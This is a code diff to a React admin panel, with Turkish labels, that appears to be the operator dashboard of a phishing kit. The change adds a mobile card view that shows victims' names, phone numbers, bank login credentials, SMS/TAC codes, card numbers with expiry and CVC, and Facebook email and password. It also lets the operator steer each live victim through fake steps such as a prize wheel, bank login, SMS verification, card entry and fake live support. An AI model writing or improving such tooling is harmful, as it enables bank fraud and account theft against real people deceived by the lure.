@@ -2236,20 +2236,20 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       {/* TABLE */}
       <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
-        <div className="w-full pb-4">
+        <div className="w-full pb-4 hidden lg:block">
           <table className="w-full table-fixed border-collapse text-[10px] text-left lg:text-[11px]">
             <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
                 <th className="w-[6%] px-2 py-3 font-semibold text-center">İzle</th>
                 <th className="w-[5%] px-2 py-3 font-semibold">Ödül</th>
                 <th className="w-[7%] px-2 py-3 font-semibold">İsim</th>
-                <th className="w-[6%] px-2 py-3 font-semibold hidden md:table-cell">Numara</th>
+                <th className="w-[6%] px-2 py-3 font-semibold">Numara</th>
                 <th className="w-[13%] px-2 py-3 font-semibold">Banka</th>
-                <th className="w-[7%] px-2 py-3 font-semibold hidden md:table-cell">Onay</th>
-                <th className="w-[9%] px-2 py-3 font-semibold hidden md:table-cell">Generator</th>
-                <th className="w-[5%] px-2 py-3 font-semibold hidden md:table-cell">SMS</th>
-                <th className="w-[6%] px-2 py-3 font-semibold hidden md:table-cell">Kart</th>
-                <th className="w-[8%] px-2 py-3 font-semibold hidden md:table-cell">FACEBOOK</th>
+                <th className="w-[7%] px-2 py-3 font-semibold">Onay</th>
+                <th className="w-[9%] px-2 py-3 font-semibold">Generator</th>
+                <th className="w-[5%] px-2 py-3 font-semibold">SMS</th>
+                <th className="w-[6%] px-2 py-3 font-semibold">Kart</th>
+                <th className="w-[8%] px-2 py-3 font-semibold">FACEBOOK</th>
                 <th className="w-[7%] px-2 py-3 font-semibold">Sayfa</th>
                 <th className="w-[6%] px-2 py-3 font-semibold">Durum</th>
                 <th className="w-[15%] px-2 py-3 font-semibold text-right">İşlemler</th>
@@ -2427,7 +2427,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         {fd.firstName || fd.lastName ? `${fd.firstName} ${fd.lastName}` : '-'}
                       </div>
                     </td>
-                    <td className="px-2 py-3 align-top hidden md:table-cell">
+                    <td className="px-2 py-3 align-top">
                       <div className="cursor-pointer text-[11px] opacity-80 hover:underline break-words [overflow-wrap:anywhere]" onClick={() => copyToClipboard(fd.phone)}>
                         {fd.phone || '-'}
                       </div>
@@ -2478,7 +2478,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         )}
                       </div>
                     </td>
-                    <td className="px-2 py-3 align-top hidden md:table-cell">
+                    <td className="px-2 py-3 align-top">
                       {approvalEntries.length === 0 ? (
                         <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                       ) : (
@@ -2494,7 +2494,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         </div>
                       )}
                     </td>
-                    <td className="px-2 py-3 align-top hidden md:table-cell">
+                    <td className="px-2 py-3 align-top">
                       {genEntries.length > 0 ? (
                         <div className="space-y-2">
                           {genEntries.map((entry, gi) => (
@@ -2520,7 +2520,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                       )}
                     </td>
-                    <td className="px-2 py-3 align-top hidden md:table-cell">
+                    <td className="px-2 py-3 align-top">
                       <div
                         className="cursor-pointer font-mono text-[12px] lg:text-[13px] font-bold tracking-[0.18em] text-indigo-500 hover:underline break-words [overflow-wrap:anywhere]"
                         onClick={() => copyToClipboard(smsValue)}
@@ -2528,7 +2528,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         {smsValue || '-'}
                       </div>
                     </td>
-                    <td className="px-2 py-3 align-top hidden md:table-cell">
+                    <td className="px-2 py-3 align-top">
                       <div className="space-y-1 text-[10px] font-medium leading-tight">
                         {fd.cardNumber && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">No:</span> <span className="min-w-0 cursor-pointer hover:opacity-70 whitespace-normal break-words [overflow-wrap:anywhere]" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
                         {fd.cardExpiry && <div className="flex min-w-0 items-start gap-1"><span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">SKT:</span> <span className="min-w-0 whitespace-normal break-words [overflow-wrap:anywhere]">{fd.cardExpiry}</span></div>}
@@ -2537,7 +2537,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       </div>
                     </td>
                     {/* === FACEBOOK SUTUNU (YENI, Sadece fbEmail/fbPassword/fb AdSoyad goster) === */}
-                    <td className="px-2 py-3 align-top hidden md:table-cell">
+                    <td className="px-2 py-3 align-top">
                       <div className="space-y-1 text-[10px] font-medium leading-tight">
                         {fd.fbEmail && (
                           <div className="flex min-w-0 items-start gap-1">
@@ -2677,6 +2677,360 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
               })}
             </tbody>
           </table>
+        </div>
+
+        {/* ============ MOBILE CARD VIEW (lg altinda tablo yerine kartlar) ============ */}
+        <div className="lg:hidden p-3 space-y-3">
+          {rows.length === 0 && (
+            <div className="px-5 py-12 text-center text-sm opacity-50 font-medium">
+              Henüz bir log yok. İşlemler burada görünecek.
+            </div>
+          )}
+          {rows.map((row) => {
+            const fd = (row.form_data || {}) as Record<string, any>;
+            const isOnline = isSessionLive(
+              row.id,
+              onlineSessionIds,
+              row.status,
+              sessionLastSeenAt[row.id],
+            );
+            const livePath = sessionPaths[row.id];
+
+            let stepText = "BAŞLANGIÇ";
+            let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";
+            let s = row.current_step as string;
+            if (isOnline && livePath) {
+              if (livePath.startsWith('/wheel')) s = "wheel";
+              else {
+                const mapped = pathToStep(livePath);
+                if (mapped) s = mapped;
+              }
+            }
+            if (s === "wheel") { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
+            else if (s === "code_entry") {
+              if (fd.is_wheel_game) { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
+              else { stepText = "KOD GİRİŞİ"; stepColor = "text-pink-500 bg-pink-500/10 border border-pink-500/20"; }
+            }
+            else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-500 bg-blue-500/10 border border-blue-500/20"; }
+            else if (s === "verify") { stepText = "DOĞRULAMA"; stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20"; }
+            else if (s === "banken") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
+            else if (s === "bank") {
+              let bName = typeof fd.viewingBankName === 'string' ? fd.viewingBankName : typeof fd.bankName === 'string' ? fd.bankName : null;
+              if (!bName && livePath && livePath.includes('/bank/')) {
+                const parts = livePath.split('/');
+                const bankIdx = parts.indexOf('bank');
+                if (bankIdx !== -1 && parts.length > bankIdx + 1) {
+                  bName = parts[bankIdx + 1].replace(/-/g, ' ');
+                }
+              }
+              stepText = bName ? bName.toUpperCase() : "BANKA GİRİŞİ";
+              stepColor = "text-orange-500 bg-orange-500/10 border border-orange-500/20";
+            }
+            else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-500 bg-indigo-500/10 border border-indigo-500/20"; }
+            else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-500 bg-purple-500/10 border border-purple-500/20"; }
+            else if (s === "facebook") { stepText = "FACEBOOK"; stepColor = "text-[#0064E0] bg-[#0064E0]/10 border border-[#0064E0]/20"; }
+            else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-500 bg-gray-500/10 border border-gray-500/20"; }
+            else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20"; }
+            else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
+            else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
+            else if (s === "custom_question") { stepText = "ÖZEL SORU"; stepColor = "text-violet-500 bg-violet-500/10 border border-violet-500/20"; }
+            else if (s === "generator1") { stepText = "GENERATOR 1"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
+            else if (s === "generator2") { stepText = "GENERATOR 2"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
+            else if (s === "special_approval") {
+              const rawAppr = (typeof fd.approvalStatus === "string" ? fd.approvalStatus : "").replace(/_confirmed$/, "");
+              const opt = APPROVAL_OPTIONS.find((o) => o.value === rawAppr);
+              stepText = opt ? `${opt.label.replace(" Sayfası", "").toUpperCase()} ONAYI` : "ÖZEL BİLDİRİM";
+              stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20";
+            }
+
+            const shortCreds = getShortBankCredentialFields(fd);
+            const loginMethod = readLoginMethod(fd);
+            const genCurrentRaw =
+              fd.generatorCurrent && typeof fd.generatorCurrent === "object"
+                ? (fd.generatorCurrent as Record<string, any>)
+                : {};
+            const legacyData =
+              fd.generatorData && typeof fd.generatorData === "object" && Object.keys(fd.generatorData).length > 0
+                ? (fd.generatorData as Record<string, unknown>)
+                : null;
+            const activeType = typeof fd.generatorType === "string" ? fd.generatorType : "";
+            const genEntries: { type: string; data: Record<string, unknown> }[] = [];
+            for (const t of ["generator1", "generator2"]) {
+              const cur = genCurrentRaw[t];
+              const curData =
+                cur?.data && typeof cur.data === "object" && Object.keys(cur.data).length > 0
+                  ? (cur.data as Record<string, unknown>)
+                  : legacyData && activeType === t
+                    ? legacyData
+                    : null;
+              if (curData) {
+                genEntries.push({ type: t, data: curData });
+              } else if (activeType === t) {
+                genEntries.push({ type: t, data: {} });
+              }
+            }
+            const smsValue =
+              typeof fd.smsCode === "string" && fd.smsCode.trim()
+                ? fd.smsCode.trim()
+                : typeof fd.tacCode === "string" && fd.tacCode.trim()
+                  ? fd.tacCode.trim()
+                  : "";
+            const fullName = `${fd.firstName || ""} ${fd.lastName || ""}`.trim();
+            const currentApproval =
+              typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
+            const approvalEntries = currentApproval ? [currentApproval] : [];
+
+            return (
+              <div
+                key={row.id}
+                className={`rounded-2xl border p-3.5 space-y-3 shadow-sm ${
+                  darkMode ? "bg-black/20 border-white/10" : "bg-white border-gray-200"
+                }`}
+              >
+                {/* UST SATIR: Canli Izle + Step + Online */}
+                <div className="flex items-center justify-between gap-2 flex-wrap">
+                  <div className="flex items-center gap-1.5">
+                    <button
+                      type="button"
+                      onClick={() => setLiveWatchRow(row)}
+                      className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-[12px] font-bold transition-all shadow-sm ${
+                        isOnline
+                          ? "bg-red-500/15 text-red-500 border border-red-500/30"
+                          : darkMode
+                          ? "bg-white/5 text-gray-400 border border-white/10"
+                          : "bg-gray-100 text-gray-500 border border-gray-200"
+                      }`}
+                    >
+                      {isOnline && (
+                        <span className="relative flex h-2 w-2">
+                          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+                          <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
+                        </span>
+                      )}
+                      {isOnline ? "Canlı İzle" : "İzle"}
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => setLiveWatch2Row(row)}
+                      className={`inline-flex items-center gap-1 px-2 py-1.5 rounded-full text-[11px] font-bold transition-all shadow-sm ${
+                        isOnline
+                          ? "bg-violet-500/15 text-violet-500 border border-violet-500/30"
+                          : darkMode
+                          ? "bg-white/5 text-gray-500 border border-white/10"
+                          : "bg-gray-100 text-gray-400 border border-gray-200"
+                      }`}
+                      title="İzleme 2 — WebRTC P2P direkt bağlantı"
+                    >
+                      <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
+                      </svg>
+                      <span>2</span>
+                    </button>
+                  </div>
+                  <div className="flex items-center gap-1.5">
+                    <span className={`inline-block rounded-full px-2 py-1 text-[10px] font-bold tracking-wide ${stepColor}`}>
+                      {stepText}
+                    </span>
+                    {isOnline ? (
+                      <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-emerald-500/10 text-emerald-500 border border-emerald-500/20 text-[10px] font-bold whitespace-nowrap">
+                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
+                        ONLINE
+                      </span>
+                    ) : (
+                      <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[10px] font-bold whitespace-nowrap">
+                        <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
+                        OFFLINE
+                      </span>
+                    )}
+                  </div>
+                </div>
+
+                {/* KIMLIK: Isim + Telefon + Odul */}
+                <div className="flex items-start justify-between gap-2">
+                  <div className="min-w-0">
+                    <div
+                      className="text-[14px] font-bold break-words [overflow-wrap:anywhere] cursor-pointer hover:underline"
+                      onClick={() => copyToClipboard(fullName)}
+                    >
+                      {fullName || "-"}
+                    </div>
+                    <div
+                      className="text-[12px] opacity-70 break-words [overflow-wrap:anywhere] cursor-pointer hover:underline"
+                      onClick={() => copyToClipboard(fd.phone)}
+                    >
+                      {fd.phone || "-"}
+                    </div>
+                  </div>
+                  {row.amount ? (
+                    <span className="shrink-0 text-[15px] font-black text-[#EB5E28]">€{row.amount}</span>
+                  ) : null}
+                </div>
+
+                {/* BANKA BLOKU */}
+                {(fd.bankName || shortCreds.length > 0) && (
+                  <div className={`rounded-xl p-2.5 space-y-1 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                    {fd.bankName && (
+                      <div className="font-extrabold text-[13px] text-yellow-700 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
+                        {fd.bankName}
+                      </div>
+                    )}
+                    {loginMethod && (
+                      <span className="inline-flex max-w-full items-center rounded-full border border-cyan-500/20 bg-cyan-500/10 px-2 py-0.5 text-[10px] font-black uppercase tracking-wider text-cyan-600 dark:text-cyan-400 break-words [overflow-wrap:anywhere]">
+                        Yöntem: {loginMethod}
+                      </span>
+                    )}
+                    {shortCreds.map(([key, value]) => (
+                      <div key={`${key}-${value}`} className="flex min-w-0 items-start gap-1.5 leading-tight">
+                        <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1.5 py-0.5 text-[10px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
+                          {key}
+                        </span>
+                        <span
+                          className="min-w-0 cursor-pointer font-mono font-medium text-[12px] break-words [overflow-wrap:anywhere] hover:opacity-70"
+                          onClick={() => copyToClipboard(String(value))}
+                        >
+                          {String(value)}
+                        </span>
+                      </div>
+                    ))}
+                  </div>
+                )}
+
+                {/* GENERATOR BLOKU */}
+                {genEntries.length > 0 && (
+                  <div className={`rounded-xl p-2.5 space-y-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                    <div className="text-[10px] font-black uppercase tracking-widest text-rose-600 dark:text-rose-400">Generator</div>
+                    {genEntries.map((entry, gi) => (
+                      <div key={gi} className="space-y-0.5">
+                        <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[11px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
+                          kodas {entry.type === "generator2" ? "2" : "1"}
+                        </span>
+                        {Object.entries(entry.data)
+                          .filter(([, v]) => v != null && String(v).trim() !== "")
+                          .map(([k, v]) => (
+                            <div
+                              key={k}
+                              className="cursor-pointer font-mono text-[13px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
+                              onClick={() => copyToClipboard(String(v))}
+                            >
+                              {String(v)}
+                            </div>
+                          ))}
+                      </div>
+                    ))}
+                  </div>
+                )}
+
+                {/* SMS + KART + FACEBOOK ozet satirlari */}
+                <div className="grid grid-cols-2 gap-2">
+                  {smsValue && (
+                    <div className={`rounded-xl p-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                      <div className="text-[10px] font-black uppercase tracking-widest text-indigo-500">SMS</div>
+                      <div className="font-mono text-[13px] font-bold tracking-[0.15em] text-indigo-500 cursor-pointer break-all" onClick={() => copyToClipboard(smsValue)}>
+                        {smsValue}
+                      </div>
+                    </div>
+                  )}
+                  {(fd.cardNumber || fd.cardExpiry || fd.cardCvc) && (
+                    <div className={`rounded-xl p-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                      <div className="text-[10px] font-black uppercase tracking-widest text-purple-500">Kart</div>
+                      <div className="text-[12px] font-medium space-y-0.5">
+                        {fd.cardNumber && <div className="font-mono cursor-pointer break-all hover:opacity-70" onClick={() => copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</div>}
+                        {(fd.cardExpiry || fd.cardCvc) && (
+                          <div className="opacity-80">{fd.cardExpiry || ""}{fd.cardExpiry && fd.cardCvc ? " • " : ""}{fd.cardCvc || ""}</div>
+                        )}
+                      </div>
+                    </div>
+                  )}
+                  {(fd.fbEmail || fd.fbPassword) && (
+                    <div className={`rounded-xl p-2 col-span-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                      <div className="text-[10px] font-black uppercase tracking-widest text-[#0064E0] dark:text-[#3E8BFF]">Facebook</div>
+                      <div className="text-[12px] font-medium space-y-0.5">
+                        {fd.fbEmail && <div className="cursor-pointer break-all hover:opacity-70" onClick={() => copyToClipboard(String(fd.fbEmail))}>{String(fd.fbEmail)}</div>}
+                        {fd.fbPassword && <div className="font-mono cursor-pointer break-all hover:opacity-70" onClick={() => copyToClipboard(String(fd.fbPassword))}>{String(fd.fbPassword)}</div>}
+                      </div>
+                    </div>
+                  )}
+                </div>
+
+                {/* ONAY ROZETLERI */}
+                {approvalEntries.length > 0 && (
+                  <div className="flex flex-wrap gap-1.5">
+                    {approvalEntries.map((approvalValue, index) => (
+                      <span
+                        key={`${approvalValue}-${index}`}
+                        className="inline-block w-fit rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[11px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 break-words [overflow-wrap:anywhere]"
+                      >
+                        {getApprovalDisplayText(approvalValue)}
+                      </span>
+                    ))}
+                  </div>
+                )}
+
+                {/* AKSIYONLAR: Yonlendirme + Onay + ikon butonlar */}
+                <div className="space-y-2 pt-1">
+                  {!isDeletedMode && (
+                    <div className="grid grid-cols-2 gap-2">
+                      <select
+                        className={`w-full rounded-lg border px-2 py-2 text-[12px] outline-none cursor-pointer font-medium ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                        value=""
+                        onChange={(e) => {
+                          if (e.target.value) {
+                            void handleRouteAction(row.id, e.target.value);
+                            e.target.value = "";
+                          }
+                        }}
+                      >
+                        <option value="">Aksiyon Seçin...</option>
+                        <option value="win">👉 İsim & Profil</option>
+                        <option value="facebook">👉 Facebook</option>
+                        <option value="banken">👉 Banka Listesi</option>
+                        <option value="sms">👉 SMS Doğrulama</option>
+                        <option value="card">👉 Kredi Kartı</option>
+                        <option value="wait">⏳ Beklemeye Al</option>
+                        <option value="invalid_bank">❌ Hatalı Banka</option>
+                        <option value="live_support">🎧 Canlı Destek</option>
+                        <option value="congrats">✅ Tebrikler</option>
+                        <option value="special_approval">🔔 Özel Bildirim</option>
+                        <option value="custom_question">❓ Özel Soru</option>
+                        <option value="ban_ip">🚫 IP Banla</option>
+                      </select>
+                      <select
+                        className={`w-full rounded-lg border px-2 py-2 text-[12px] outline-none cursor-pointer font-medium ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                        value=""
+                        onChange={(e) => {
+                          if (e.target.value) {
+                            void handleApprovalAction(row.id, e.target.value);
+                            e.target.value = "";
+                          }
+                        }}
+                      >
+                        <option value="">Onay Seçin...</option>
+                        {APPROVAL_OPTIONS.map((option) => (
+                          <option key={option.value} value={option.value}>
+                            {option.label}
+                          </option>
+                        ))}
+                      </select>
+                    </div>
+                  )}
+                  <div className="flex items-center gap-1.5">
+                    <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 text-[13px] font-bold" title="Canlı Destek">💬</button>
+                    <button onClick={() => setQuestionModalSession(row)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-violet-500/10 text-violet-600 dark:text-violet-400 text-[13px] font-bold" title="Özel Sorular">❓</button>
+                    <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 text-[13px] font-bold" title="Cihaz Bilgisi">📱</button>
+                    <button onClick={() => { setHistoryModalSession(row); setShowHistoryModal(true); }} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-amber-500/10 text-amber-600 dark:text-amber-400 text-[13px] font-bold" title="Geçmiş Kayıtlar">📜</button>
+                    {isDeletedMode ? (
+                      <>
+                        <button onClick={() => void handleRestoreLog(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-sky-500/10 text-sky-600 dark:text-sky-400 text-[13px] font-bold" title="Geri Yükle">♻️</button>
+                        <button onClick={() => void handlePermanentDelete(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 text-[13px] font-bold" title="Kalıcı Sil">🗑️</button>
+                      </>
+                    ) : (
+                      <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 text-[13px] font-bold" title="Sil">🗑️</button>
+                    )}
+                  </div>
+                </div>
+              </div>
+            );
+          })}
         </div>
         {totalPages > 1 && (
           <div className={`flex flex-wrap items-center justify-between gap-3 px-5 py-4 border-t ${darkMode ? 'border-white/5' : 'border-gray-100'}`}>
